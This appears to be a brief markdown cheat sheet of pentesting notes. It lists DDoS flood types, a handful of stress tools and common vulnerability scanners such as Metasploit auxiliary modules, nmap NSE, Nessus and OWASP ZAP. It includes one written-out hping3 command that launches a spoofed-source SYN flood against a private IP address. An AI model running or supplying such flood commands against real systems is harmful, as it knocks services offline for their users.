##DDOS
- HTTP requests(hulk, gohulk)
- TCP/SYN flood
- UDP flood
- ICMP flood
- DNS flood
- MAC flood

## Tools
- hping3
```
hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source 192.168.1.1
```

## Vulnerability scan
- Armitage/Msf aux
- nmap nse
- Wpscan nikto
- acunetix | owasp zap
- nessus | openvas
- MaxPatrol
